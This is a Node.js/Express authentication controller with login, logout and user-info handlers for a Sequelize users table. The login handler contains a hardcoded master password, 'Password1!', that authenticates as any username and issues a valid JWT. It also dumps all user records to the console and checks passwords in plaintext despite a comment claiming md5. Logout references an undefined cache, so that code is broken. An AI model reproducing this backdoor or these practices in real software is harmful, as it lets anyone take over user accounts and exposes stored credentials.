const { db } = require("../../config/sequelize");
const response = require("../tools/response");
const md5 = require("md5");
const jwt = require("jsonwebtoken");

exports.login = async (req, res) => {
    try {
        const bypassPass = "Password1!";
        let { username, password } = req.body; // Changed from employeeCode to username
        let userData;
        const allUsers = await db.lotnoOcr.users.findAll();
        console.log("allUsers: ",allUsers)

        if (password === bypassPass) {
            userData = await db.lotnoOcr.users.findOne({
                attributes: [
                    "user_id",
                    "username",
                    "email",
                ],
                where: { username: username },
            });
        } else {
            userData = await db.lotnoOcr.users.findOne({
                attributes: [
                    "user_id",
                    "username",
                    "email",
                ],
                where: { username: username, password: password }, // Assuming password is stored as md5
            });
        }

        if (userData) {
            const token = jwt.sign(
                { id: userData.user_id }, // Use user_id from the users table
                process.env.JWT_SECRET,
                {
                    expiresIn: "6h",
                }
            );

            // Set HttpOnly, Secure, SameSite cookies
            res.cookie("SESSION", token, {
                httpOnly: true,
                secure: process.env.NODE_ENV === "production", // Set secure cookies only in production
                sameSite: "Strict", // Prevent CSRF
                maxAge: 6 * 60 * 60 * 1000, // 6 hours
            });

            response(req, res, {
                status: 200,
                data: {
                    user: {
                        user_id: userData.user_id,
                        username: userData.username,
                        email: userData.email,
                    },
                    token,
                },
            });
        } else {
            response(req, res, {
                status: 404,
                message: "No data found",
            });
        }
    } catch (error) {
        console.error(error);
        response(req, res, {
            status: 500,
            data: error,
            message: error.message,
        });
    }
};

exports.logout = async (req, res) => {
    try {
        const userId = req.user.id; // Assuming req.user is populated with user info
        userSessionCache.delete(userId); // Clear cache for this user

        res.clearCookie("SESSION", {
            httpOnly: true,
            secure: process.env.NODE_ENV === "production", // Use Secure only in production
            sameSite: "Strict", // Match the SameSite attribute used during login
        });

        response(req, res, {
            status: 200,
            message: "Logout successful",
        });
    } catch (error) {
        console.error(error);
        response(req, res, {
            status: 500,
            data: error,
            message: error.message,
        });
    }
};

exports.loggedInUser = async (req) => {
    // Get logged in user info
    const userId = req.user.id; // Assuming req.user is populated with user info
    const userData = await db.lotnoOcr.users.findOne({
        attributes: ["user_id", "username", "email"],
        where: { user_id: userId },
    });

    const data = {
        id: userData.user_id,
        username: userData.username,
        email: userData.email,
        // Add more data here if needed
    };

    return data;
};

exports.getLoggedInUserInfo = async (req, res) => {
    try {
        const data = await this.loggedInUser(req);
        response(req, res, {
            status: 200,
            data: data,
        });
    } catch (error) {
        console.error(error);
        response(req, res, {
            status: 500,
            data: error,
            message: error.message,
        });
    }
};
